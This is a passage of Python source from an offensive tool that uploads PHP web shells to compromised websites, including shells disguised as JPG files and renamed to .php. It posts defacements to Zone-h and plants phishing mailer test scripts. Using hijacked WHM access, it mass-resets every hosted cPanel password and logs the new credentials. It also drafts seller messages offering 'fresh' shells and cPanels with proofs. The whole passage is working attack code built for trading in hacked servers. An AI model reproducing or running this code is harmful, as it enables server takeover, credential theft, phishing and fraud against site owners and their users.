        except: up = content_Fox(req.post(url, data=filedata, files=fileup, headers=headers1, verify=False, timeout=60))
        if (str(filename) in up): shell_path = shellPath_Fox(url, filename, 2)
        else: shell_path = shellPath_Fox(url, filename, 1)
        sh_check = requestG_Fox(shell_path, 1, headers1)
        if ('KEY:' in sh_check or 'MD5:' in sh_check): return shell_path, req
        return 'F', req
    except :
        return 'F', ''

def WSO(url, cookies):
    try:
        filename = '{}.php'.format(random_Fox(8))
        post_w = {'a': 'FilesTools', 'p1': filename, 'p2': 'mkfile', 'p3': '<{}'.format(shell_Fox), 'ne': '', 'charset': 'Windows-1251', 'c': ''}
        try: cookies.post(url, data=post_w, headers=headers1, verify=False, timeout=90)
        except: cookies.post(url, data=post_w, headers=headers1, verify=False, timeout=180)
        shell_path = shellPath_Fox(url, filename, 1)
        sh_check = requestG_Fox(shell_path, 1, headers1)
        if ('KEY:' in sh_check or 'MD5:' in sh_check): return shell_path
        return 'F'
    except:
        return 'F'

def jpg_shell_uploader(url, check, cookies):
    try:
        getFile('fox.jpg', '49631467080528197')
        filename_jpg = '{}.jpg'.format(random_Fox(3))
        shell_jpg = '{}\n{}'.format(file_get_contents_Fox2('Files/fox.jpg'), shell_Fox)
        filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
        if ('name=f[]' in check): fileup = {'f[]': (filename_jpg, shell_jpg, 'multipart/form-data')}
        elif ('uploadFile' in check): fileup = {'f': (filename_jpg, shell_jpg, 'multipart/form-data')}
        else: fileup = {'file': (filename_jpg, shell_jpg, 'multipart/form-data')}
        try: up = cookies.post(url, data=filedata, files=fileup, headers=headers1, verify=False, timeout=90)
        except: up = cookies.post(url, data=filedata, files=fileup, headers=headers1, verify=False, timeout=180)
        if (up.status_code == 401 or up.status_code == 402 or up.status_code == 403 or up.status_code == 405 or up.status_code == 406): return 'F'
        filename_php = '{}.php'.format(random_Fox(3))
        if ('uploadFile' in check): post_r = {'a': 'FilesTools', 'p1': filename_jpg, 'p2': 'rename', 'p3': filename_php, 'ne': '', 'charset': 'Windows-1251', 'c': ''}
        else: post_r = {'fname': filename_jpg, 'sname': filename_php}
        try: rename = cookies.post(url, data=post_r, headers=headers1, verify=False, timeout=15)
        except: rename = cookies.post(url, data=post_r, headers=headers1, verify=False, timeout=30)
        if (rename.status_code == 401 or rename.status_code == 402 or rename.status_code == 403 or rename.status_code == 405 or rename.status_code == 406): return 'F'
        shell_path = url.replace(url.split('/')[-1], filename_php)
        sh_check = requestG_Fox(shell_path, 1, headers1)
        if ('KEY:' in sh_check or 'MD5:' in sh_check): return shell_path
        return 'F'
    except:
        return 'F'

def file_UPloader_ALL(url, typ = 0):
    try:
        source = requestG_Fox(url, 1, headers1)
        if(source is False):
            if (typ == 1): print('   {}[-] Failed Upload.'.format(fr))
            return False
        shell_path1 = file_SemiUPer(url, source)
        if (shell_path1[0] != 'F'): return shell_path1[0]
        shell_path2 = shellPathFinder(url, source)
        if (shell_path2 != 'F'): return shell_path2
        if (('charset' in source and 'uploadFile' in source) or 'Drive Uploader' in source):
            shell_path3 = jpg_shell_uploader(url, source, shell_path1[1])
            if (shell_path3 != 'F'): return shell_path3
            if ('charset' in source and 'uploadFile' in source):
                shell_path4 = WSO(url, shell_path1[1])
                if (shell_path4 != 'F'): return shell_path4
        if(typ == 1): print('   {}[-] Failed Upload.'.format(fr))
        return False
    except:
        if(typ == 1): print('   {}[-] Failed Upload.'.format(fr))
        return False

def zone_h(indexURL, attacker):
    try:
        sys.stdout.write('   {}[*] Posting in Zone-h '.format(fw)); waiting()
        post_g = {'defacer': attacker, 'domain1': indexURL, 'hackmode': '1', 'reason': '1'}
        p_zone = requestP_Fox('http://www.zone-h.org/notify/single', 1, post_g, headers1, 30)
        if ('"red">OK</font>' in p_zone): print('   {}[+] Succeed.'.format(fg))
        elif ('Domain has been defaced during last year' in p_zone): print('   {}[-] Domain has been defaced during last year.'.format(fr))
        elif ('banned' in p_zone): print('   {}[-] your IP is banned.'.format(fr))
        else: print('   {}[-] Failed.'.format(fr))
    except:
        print('   {}[-] Failed.'.format(fr))

def solving_SH_Reports_S(backdoor, shell, email, test):
    try:
        global success2
        if('http://' in backdoor): backdoor = backdoor.replace('http://', 'https://')
        if('http://' in shell): shell = shell.replace('http://', 'https://')
        domain = domain_Fox(backdoor)
        safebrowsing = requestG_Fox('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), 1, headers1)
        if (safebrowsing is False): print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr)); return
        alert_Fox = safebrowsing.split(',')
        if ('2' in alert_Fox[1]): print('   {}[-] Phishing.'.format(fr)); return
        testname = 'test-{}.php'.format(random_Fox(3))
        ziprname = 'unZIPpeR{}.php'.format(random_Fox(3))
        Test_path = shellPath_Fox(backdoor, testname, 1)
        UNZIPper_path = shellPath_Fox(backdoor, ziprname, 1)
        filedata = {'action': 'upload'}
        fileup_Test = {'file': (testname, file_get_contents_Fox('Files/{}.txt'.format(test)))}
        fileup_ZIPper = {'file': (ziprname, file_get_contents_Fox('Files/uz.txt'))}
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=60))
        if('<successfully>' in upFile):
            print ('   {}[+] Upload is Working.'.format(fg))
            try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=45))
            except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=60))
            post_e = {'email': email}
            IDsend = requestP_Fox(Test_path, 1, post_e, headers1)
            if (re.findall(re.compile('<id>(.*)</id>'), IDsend)):
                ID_s = re.findall(re.compile('<id>(.*)</id>'), IDsend)[0]
                print( '   {}[+] Check your Email, ID: {}{}'.format(fg, fr, ID_s))
            open('Results/Form_reports_of_Shells.txt', 'a').write('Sir, I will give you a fresh Shell as a [Replacement] with full proofs.\n\nFresh Shell => {}\n\nProof for not phishing and open fine => \nProof for send results => \nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(shell, Test_path, UNZIPper_path)); success2 = 1
        else: print('   {}[-] Upload Failed.'.format(fr))
    except:
        print ('   {}[-] Shell isn\'t working OR Not-{}Https{}.'.format(fr, fg, fr))

def solving_cP_Reports_S(ip, user, password, idcp, cookies, domain, home, email, test) :
    try:
        global success2
        safebrowsing = requestG_Fox('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), 1, headers1)
        if (safebrowsing is False): print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr)); return
        alert_Fox = safebrowsing.split(',')
        if ('2' in str(alert_Fox[1])): print('   {}[-] Phishing.'.format(fr)); return
        req_Fox = requests.session()
        postlogin_Fox = {'user': user, 'pass': password, 'login_submit': 'Log in'}
        try: login2_Fox = content_Fox(req_Fox.post('https://{}:2083/login/?login_only=1'.format(domain), data=postlogin_Fox, headers=headers1, timeout=10))
        except: login2_Fox = content_Fox(req_Fox.post('https://{}:2083/login/?login_only=1'.format(domain), data=postlogin_Fox, headers=headers1, timeout=15))
        if ('security_token' not in login2_Fox): print('   {}[-] Domain isn\'t Working.'.format(fr)); return
        print ('   {}[+] Domain is Working.'.format(fg))
        filename = '{}.php'.format(random_Fox(8))
        testname = 'test-{}.php'.format(random_Fox(3))
        ziprname = 'unZIPpeR{}.php'.format(random_Fox(3))
        filedata_Fox = {'dir': '{}{}/public_html'.format(home, user), 'get_disk_info': '1', 'overwrite': '0'}
        fileup_Fox = {'file-0': (filename, shell_Fox)}
        try: upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=45)
        except: upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=60)
        backdoor_path = 'https://{}/{}'.format(domain, filename)
        time.sleep(5)
        try: check_b = content_Fox(requests.get(backdoor_path, headers=headers1, timeout=10))
        except: check_b = content_Fox(requests.get(backdoor_path, headers=headers1, timeout=15))
        if ('KEY:' not in check_b and 'MD5:' not in check_b): print('   {}[-] Upload Failed.'.format(fr)); return
        Test_path = shellPath_Fox(backdoor_path, testname, 1)
        UNZIPper_path = shellPath_Fox(backdoor_path, ziprname, 1)
        filedata = {'action': 'upload'}
        fileup_Test = {'file': (testname, file_get_contents_Fox('Files/{}.txt'.format(test)))}
        fileup_ZIPper = {'file': (ziprname, file_get_contents_Fox('Files/uz.txt'))}
        backdoor_path = check(backdoor_path)
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=60))
        if('<successfully>' in upFile):
            print ('   {}[+] Upload is Working.'.format(fg))
            try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=45))
            except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=60))
            post_e = {'email': email}
            IDsend = requestP_Fox(Test_path, 1, post_e, headers1)
            if (re.findall(re.compile('<id>(.*)</id>'), IDsend)):
                ID_s = re.findall(re.compile('<id>(.*)</id>'), IDsend)[0]
                print( '   {}[+] Check your Email, ID: {}{}'.format(fg, fr, ID_s))
            open('Results/Form_reports_of_cPanels.txt', 'a').write('Sir, I will give you a fresh cPanel as a [Replacement] with full proofs.\n\nFresh cPanel: https://{}:2083\nUSERNAME: {}\nPASSWORD: {}\n\nProof for not phishing and open fine => \nProof for send results => \nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(domain, user, password, Test_path, UNZIPper_path)); success2 = 1
        else: print('   {}[-] Upload Failed.'.format(fr))
    except:
        print ('   {}[-] Domain isn\'t working OR Not-{}Https{}.'.format(fr, fg, fr))

def solving_SH_Reports_A(backdoor, shell, test):
    try:
        global success1
        delete_files('screenshots', 'png')
        from selenium import webdriver
        from imgurpython import ImgurClient
        newpath = r'screenshots'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        if('http://' in backdoor): backdoor = backdoor.replace('http://', 'https://')
        if('http://' in shell): shell = shell.replace('http://', 'https://')
        domain = domain_Fox(backdoor)
        safebrowsing = requestG_Fox('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), 1, headers1)
        if (safebrowsing is False): print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr)); return
        alert_Fox = safebrowsing.split(',')
        if ('2' in str(alert_Fox[1])): print('   {}[-] Phishing.'.format(fr)); return
        testname = 'test-{}.php'.format(random_Fox(3))
        ziprname = 'unZIPpeR{}.php'.format(random_Fox(3))
        Test_path = shellPath_Fox(backdoor, testname, 1)
        UNZIPper_path = shellPath_Fox(backdoor, ziprname, 1)
        filedata = {'action': 'upload'}
        fileup_Test = {'file': (testname, file_get_contents_Fox('Files/{}.txt'.format(test)))}
        fileup_ZIPper = {'file': (ziprname, file_get_contents_Fox('Files/uz.txt'))}
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), files=fileup_Test, data=filedata, headers=headers2, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), files=fileup_Test, data=filedata, headers=headers2, timeout=60))
        if('<successfully>' in upFile):
            print ('   {}[+] Upload is Working.'.format(fg))
            try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=45))
            except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=60))
            try:
                options_Fox = webdriver.ChromeOptions()
                options_Fox.add_experimental_option('excludeSwitches', ['enable-logging'])
                driver_Fox = webdriver.Chrome(options=options_Fox)
            except: print('\n   [!] Error, You have to Donwload [ChromeDriver], Read how => https://textbin.net/raw/hqlkimif7g \n'); return
            driver_Fox.execute_script("window.open('{}', 'fox1');".format('https://generator.email'))
            driver_Fox.switch_to.window("fox1")
            time.sleep(3)
            html_Fox = str(driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML").encode("utf-8"))
            mailname = re.findall(re.compile('<span id="email_ch_text">(.*)</span></b><p>'), html_Fox)[0]
            orderID = '{} - {}'.format(domain_Fox(Test_path), str(random.randint(1, 100000) * 987))
            driver_Fox.execute_script("window.open('{}', 'fox2');".format(Test_path))
            driver_Fox.switch_to.window("fox2")
            time.sleep(3)
            driver_Fox.find_element(By.NAME, 'email').send_keys(mailname)
            time.sleep(1.5)
            driver_Fox.find_element(By.NAME, 'orderid').send_keys(orderID)
            time.sleep(1.5)
            driver_Fox.find_element(By.XPATH, '//input[3]').click()
            time.sleep(1.5)
            driver_Fox.switch_to.window("fox1")
            time.sleep(7)
            html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
            start = timer()
            while ((str(orderID) not in str(html_Fox.encode("utf-8"))) and ((timer() - start) < 38)):
                time.sleep(5)
                html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
            if (str(orderID) in str(html_Fox.encode("utf-8"))):
                print ('   {}[+] Sending mail is Working.'.format(fg))
                namepng = '{}.png'.format(random_Fox(15))
                driver_Fox.set_window_size(1400, 1000)
                driver_Fox.get_screenshot_as_file('screenshots/{}'.format(namepng))
                proofS = imgurproof(namepng)
                if (proofS is False):
                    from gyazo import Api
                    proofS = gyazoproof(namepng)
                driver_Fox.execute_script("window.open('{}', 'fox3');".format(shell))
                driver_Fox.switch_to.window("fox3")
                time.sleep(3)
                namepng = '{}.png'.format(random_Fox(15))
                driver_Fox.get_screenshot_as_file('screenshots/{}'.format(namepng))
                proofW = imgurproof(namepng)
                if (proofW is False):
                    from gyazo import Api
                    proofW = gyazoproof(namepng)
                open('Results/Reports_of_Shells.txt', 'a').write('Sir, I will give you a fresh Shell as a [Replacement] with full proofs.\n\nFresh Shell => {}\n\nProof for not phishing and open fine => {}\nProof for send results => {}\nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(shell, proofW, proofS, Test_path, UNZIPper_path)); success1 = 1
            else: print('   {}[-] Sending mail isn\'t Working.'.format(fr))
            driver_Fox.quit()
        else: print('   {}[-] Upload Failed.'.format(fr))
    except:
        print ('   {}[-] Shell isn\'t working OR Not-{}Https{}.'.format(fr, fg, fr))
        try: driver_Fox.quit()
        except: pass

def solving_cP_Reports_A(ip, user, password, idcp, cookies, domain, home, test):
    try:
        global success1
        delete_files('screenshots', 'png')
        from selenium import webdriver
        from imgurpython import ImgurClient
        newpath = r'screenshots'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        safebrowsing = requestG_Fox('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), 1, headers1)
        if (safebrowsing is False): print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr)); return
        alert_Fox = safebrowsing.split(',')
        if ('2' in str(alert_Fox[1])): print('   {}[-] Phishing.'.format(fr)); return
        req_Fox = requests.session()
        postlogin_Fox = {'user': user, 'pass': password, 'login_submit': 'Log in'}
        try: login2_Fox = content_Fox(req_Fox.post('https://{}:2083/login/?login_only=1'.format(domain), data=postlogin_Fox, headers=headers1, timeout=10))
        except: login2_Fox = content_Fox(req_Fox.post('https://{}:2083/login/?login_only=1'.format(domain), data=postlogin_Fox, headers=headers1, timeout=15))
        if ('security_token' not in login2_Fox): print('   {}[-] Domain isn\'t Working.'.format(fr)); return
        print ('   {}[+] Domain is Working.'.format(fg))
        filename = '{}.php'.format(random_Fox(8))
        testname = 'test-{}.php'.format(random_Fox(3))
        ziprname = 'unZIPpeR{}.php'.format(random_Fox(3))
        filedata_Fox = {'dir': '{}{}/public_html'.format(home, user), 'get_disk_info': '1', 'overwrite': '0'}
        fileup_Fox = {'file-0': (filename, shell_Fox)}
        try: upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=45)
        except: upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=60)
        backdoor_path = 'https://{}/{}'.format(domain, filename)
        time.sleep(5)
        try: check_b = content_Fox(requests.get(backdoor_path, headers=headers1, timeout=10))
        except: check_b = content_Fox(requests.get(backdoor_path, headers=headers1, timeout=15))
        if ('KEY:' not in check_b and 'MD5:' not in check_b): print('   {}[-] Upload Failed.'.format(fr)); return
        Test_path = shellPath_Fox(backdoor_path, testname, 1)
        UNZIPper_path = shellPath_Fox(backdoor_path, ziprname, 1)
        filedata = {'action': 'upload'}
        fileup_Test = {'file': (testname, file_get_contents_Fox('Files/{}.txt'.format(test)))}
        fileup_ZIPper = {'file': (ziprname, file_get_contents_Fox('Files/uz.txt'))}
        backdoor_path = check(backdoor_path)
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=60))
        if('<successfully>' in upFile):
            print ('   {}[+] Upload is Working.'.format(fg))
            try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=45))
            except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor_path, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_ZIPper, headers=headers2, timeout=60))
            try:
                options_Fox = webdriver.ChromeOptions()
                options_Fox.add_experimental_option('excludeSwitches', ['enable-logging'])
                driver_Fox = webdriver.Chrome(options=options_Fox)
            except: print('\n   [!] Error, You have to Donwload [ChromeDriver], Read how => https://textbin.net/raw/hqlkimif7g \n'); return
            driver_Fox.execute_script("window.open('{}', 'fox1');".format('https://generator.email'))
            driver_Fox.switch_to.window("fox1")
            time.sleep(3)
            html_Fox = str(driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML").encode("utf-8"))
            mailname = re.findall(re.compile('<span id="email_ch_text">(.*)</span></b><p>'), html_Fox)[0]
            orderID = '{} - {}'.format(domain_Fox(Test_path), str(random.randint(1, 100000) * 987))
            driver_Fox.execute_script("window.open('{}', 'fox2');".format(Test_path))
            driver_Fox.switch_to.window("fox2")
            time.sleep(3)
            driver_Fox.find_element(By.NAME, 'email').send_keys(mailname)
            time.sleep(1.5)
            driver_Fox.find_element(By.NAME, 'orderid').send_keys(orderID)
            time.sleep(1.5)
            driver_Fox.find_element(By.XPATH, '//input[3]').click()
            time.sleep(1.5)
            driver_Fox.switch_to.window("fox1")
            time.sleep(7)
            html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
            start = timer()
            while ((str(orderID) not in str(html_Fox.encode("utf-8"))) and ((timer() - start) < 38)):
                time.sleep(5)
                html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
            if (str(orderID) in str(html_Fox.encode("utf-8"))):
                print ('   {}[+] Sending mail is Working.'.format(fg))
                namepng = '{}.png'.format(random_Fox(15))
                driver_Fox.set_window_size(1400, 1000)
                driver_Fox.get_screenshot_as_file('screenshots/{}'.format(namepng))
                proofS = imgurproof(namepng)
                if (proofS is False):
                    from gyazo import Api
                    proofS = gyazoproof(namepng)
                driver_Fox.execute_script("window.open('{}', 'fox3');".format('https://{}:2083/login/'.format(domain)))
                driver_Fox.switch_to.window("fox3")
                time.sleep(4)
                driver_Fox.find_element(By.NAME, 'user').send_keys(user)
                time.sleep(1.5)
                driver_Fox.find_element(By.NAME, 'pass').send_keys(password)
                time.sleep(1.5)
                driver_Fox.find_element(By.NAME, 'login').click()
                time.sleep(7)
                namepng = '{}.png'.format(random_Fox(15))
                driver_Fox.get_screenshot_as_file('screenshots/{}'.format(namepng))
                proofW = imgurproof(namepng)
                if (proofW is False):
                    from gyazo import Api
                    proofW = gyazoproof(namepng)
                open('Results/Reports_of_cPanels.txt', 'a').write('Sir, I will give you a fresh cPanel as a [Replacement] with full proofs.\n\nFresh cPanel: https://{}:2083\nUSERNAME: {}\nPASSWORD: {}\n\nProof for not phishing and open fine => {}\nProof for send results => {}\nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(domain, user, password, proofW, proofS, Test_path, UNZIPper_path)); success1 = 1
            else: print('   {}[-] Sending mail isn\'t Working.'.format(fr))
            driver_Fox.quit()
        else: print('   {}[-] Upload Failed.'.format(fr))
    except:
        print('   {}[-] Domain isn\'t working OR Not-{}Https{}.'.format(fr, fg, fr))
        try: driver_Fox.quit()
        except: pass

def WHM_exploiter(backdoor, cpanelRs):
    try:
        sys.stdout.write('   {}[*] Getting cPanels from WHM '.format(fc)); waiting()
        for rs in cpanelRs:
            rs = rs.split('|')
            username = rs[1]
            password = rs[2]
            try:
                ip = 'https://{}:2087'.format(domain_Fox(backdoor))
                ipHost = socket.gethostbyname(domain_Fox(backdoor))
                c = WHM_PWD_CHer_P(ip, username, password, ipHost)
                if (c is False): print ('   {}    - {}{}{} [Failed]'.format(fr, fw, username, fr))
                elif (c == 0): print ('   {}    - {}{}{} [{}{} USERS{}]'.format(fr, fw, username, fr, fg, c, fr))
                else: print ('   {}[+] Saved in {}Results/WHM/{}-{}.txt'.format(fg, fr, ipHost, username))
            except: print ('   {}    - {}{}{} [Failed]'.format(fr, fw, username, fr))
    except:
        print('   {}[-] Failed.'.format(fr))

def WHM_AH_exploiter(backdoor):
    global backdoor3
    try:
        sys.stdout.write('   {}[*] Getting cPanels from WHM '.format(fc)); waiting()
        hashs = requestG_Fox('{}?action={}'.format(backdoor, backdoor3), 1, headers1, 30)
        if (re.findall(re.compile('<accesshash>(.*):(.*)</accesshash>'), hashs)): hashs = re.findall(re.compile('<accesshash>(.*):(.*)</accesshash>'), hashs)
        for h in hashs:
            username = h[0]
            try:
                accesshash = h[1]
                ip = 'https://{}:2087'.format(domain_Fox(backdoor))
                ipHost = socket.gethostbyname(domain_Fox(backdoor))
                c = WHM_PWD_CHer_A(ip, username, accesshash, ipHost)
                if (c is False): print ('   {}    - {}{}{} [Failed]'.format(fr, fw, username, fr))
                elif (c == 0): print ('   {}    - {}{}{} [{}{} USERS{}]'.format(fr, fw, username, fr, fg, c, fr))
                else: print ('   {}[+] Saved in {}Results/WHM/{}-{}.txt'.format(fg, fr, ipHost, username))
            except: print ('   {}    - {}{}{} [Failed]'.format(fr, fw, username, fr))
    except:
        print('   {}[-] Failed.'.format(fr))

def WHM_PWD_CHer_A(ip, username, accesshash, ipHost):
    try:
        counter = 0
        newpath = r'Results/WHM'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        login = WHM_Login_A(ip, username, accesshash)
        if (login is False): return False
        headers_WHM = login
        if (':2087' in ip):
            protocol = 'https://'
            port = ':2083'
            ipcp = ip.replace('2087', '2083')
        elif (':2086' in ip):
            protocol = 'http://'
            port = ':2082'
            ipcp = ip.replace('2086', '2082')
        else:
            protocol = 'https://'
            port = ':2083'
            ipcp = '{}:2083'.format(ip)
        try: getUser = content_Fox(requests.get('{}/json-api/listaccts?viewall=1'.format(ip), headers=headers_WHM, verify=False, timeout=30))
        except: getUser = content_Fox(requests.get('{}/json-api/listaccts?viewall=1'.format(ip), headers=headers_WHM, verify=False, timeout=45))
        try:
            listaccts = json.loads(getUser)
            usersdata = listaccts['acct']
        except: return counter
        for userdata in usersdata:
            try:
                user = userdata.get('user')
                domain = userdata.get('domain')
                if (str(username) != str(user)):
                    newPasswd = passwrod_creator()
                    postchangeP = {'api.version': '1', 'password': newPasswd, 'user': user}
                    try: changePR = requests.post('{}/json-api/passwd'.format(ip), headers=headers_WHM, data=postchangeP, verify=False, timeout=30)
                    except: changePR = requests.post('{}/json-api/passwd'.format(ip), headers=headers_WHM, data=postchangeP, verify=False, timeout=45)
                    if (changePR):
                        counter = counter + 1
                        sys.stdout.write('\r   {}    - {}{}{} [{}{} USERS{}]'.format(fr, fw, username, fr, fg, counter, fr))
                        sys.stdout.flush()
                        open('Results/WHM/{}-{}.txt'.format(ipHost, username), 'a').write('{}{}{}|{}|{}\n'.format(protocol, domain, port, user, newPasswd))
            except:
                pass
        print ('')
        return counter
    except:
        return False

def WHM_PWD_CHer_P(ip, username, password, ipHost) :
    try:
        counter = 0
        newpath = r'Results/WHM'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        login = WHM_Login_P(ip, username, password)
        if (login is False): return False
        cookies = login[0]
        idcp = login[1]
        if (':2087' in ip):
            protocol = 'https://'
            port = ':2083'
            ipcp = ip.replace('2087', '2083')
        elif (':2086' in ip):
            protocol = 'http://'
            port = ':2082'
            ipcp = ip.replace('2086', '2082')
        else:
            protocol = 'https://'
            port = ':2083'
            ipcp = '{}:2083'.format(ip)
        try: getUser = content_Fox(cookies.get('{}/{}/json-api/listaccts?viewall=1'.format(ip, idcp), verify=False, timeout=30))
        except: getUser = content_Fox(cookies.get('{}/{}/json-api/listaccts?viewall=1'.format(ip, idcp), verify=False, timeout=45))
        try:
            listaccts = json.loads(getUser)
            usersdata = listaccts['acct']
        except: return counter
        for userdata in usersdata:
            try:
                user = userdata.get('user')
                domain = userdata.get('domain')
                if (str(username) != str(user)):
                    newPasswd = passwrod_creator()
                    postchangeP = {'api.version': '1', 'password': newPasswd, 'user': user}
                    try: changePR = cookies.post('{}/{}/json-api/passwd'.format(ip, idcp), data=postchangeP, verify=False, timeout=30)
                    except: changePR = cookies.post('{}/{}/json-api/passwd'.format(ip, idcp), data=postchangeP, verify=False, timeout=45)
                    if (changePR):
                        counter = counter + 1
                        sys.stdout.write('\r   {}    - {}{}{} [{}{} USERS{}]'.format(fr, fw, username, fr, fg, counter, fr))
                        sys.stdout.flush()
                        open('Results/WHM/{}-{}.txt'.format(ipHost, username), 'a').write('{}{}{}|{}|{}\n'.format(protocol, domain, port, user, newPasswd))
            except:
                pass
        print ('')
        return counter
    except:
        return False

def WHM_Login_A(ip, username, accesshash):
    try:
        if ('\n' in accesshash): accesshash = accesshash.replace('\n', '')
        headers_WHM = {'Authorization': 'WHM {}:{}'.format(username, accesshash)}
        try: login = content_Fox(requests.get('{}/json-api/'.format(ip), headers=headers_WHM, verify=False, timeout=10))
        except: login = content_Fox(requests.get('{}/json-api/'.format(ip), headers=headers_WHM, verify=False, timeout=15))
        if ('Unknown App Requested' in login): return headers_WHM
        else: return False
    except:
        return False

def WHM_Login_P(ip, username, password):
    try:
        req = requests.session()
        postlogin = {'user': username, 'pass': password, 'login_submit': 'Log in', 'goto_uri': '/'}
        try: login = content_Fox(req.post('{}/login/?login_only=1'.format(ip), data=postlogin, verify=False, timeout=10))
        except: login = content_Fox(req.post('{}/login/?login_only=1'.format(ip), data=postlogin, verify=False, timeout=15))
        if ('security_token' not in login): return False
        loginJson = json.loads(login)
        idcp = loginJson["security_token"][1:]
        return req, idcp
    except:
        return False

def cPanel_Login(ip, username, password):
    try:
        reqFox = requests.session()
        postlogin_Fox = {'user': username, 'pass': password, 'login_submit': 'Log in'}
        try: loginCP_Fox = content_Fox(reqFox.post('{}/login/'.format(ip), verify=False, data=postlogin_Fox, headers=headers1, timeout=10))
        except: loginCP_Fox = content_Fox(reqFox.post('{}/login/'.format(ip), verify=False, data=postlogin_Fox, headers=headers1, timeout=15))
        if ('filemanager' in loginCP_Fox or '/home' in loginCP_Fox):
            open('Results/Successfully_logged_cPanels.log', 'a').write('{}|{}|{}\n'.format(ip, username, password))
            if (re.findall(re.compile('PAGE.securityToken.*=.*"(.*)/(.*)";'), loginCP_Fox)): idcp_Fox = re.findall(re.compile('PAGE.securityToken.*=.*"(.*)/(.*)";'), loginCP_Fox)[0][1]
            elif (re.findall(re.compile('MASTER.securityToken.*=.*"(.*)/(.*)";'), loginCP_Fox)): idcp_Fox = re.findall(re.compile('MASTER.securityToken.*=.*"(.*)/(.*)";'), loginCP_Fox)[0][1]
            elif (re.findall(re.compile('href="/cpsess(.*)/3rdparty'), loginCP_Fox)): idcp_Fox = 'cpsess{}'.format( re.findall(re.compile('href="/cpsess(.*)/3rdparty'), loginCP_Fox)[0])
            elif (re.findall(re.compile('href="/cpsess(.*)/frontend/'), loginCP_Fox)): idcp_Fox = 'cpsess{}'.format(re.findall(re.compile('href="/cpsess(.*)/frontend'), loginCP_Fox)[0])
            elif (re.findall(re.compile('href="/cpsess(.*)/xferwhm'), loginCP_Fox)): idcp_Fox = 'cpsess{}'.format(re.findall(re.compile('href="/cpsess(.*)/xferwhm'), loginCP_Fox)[0])
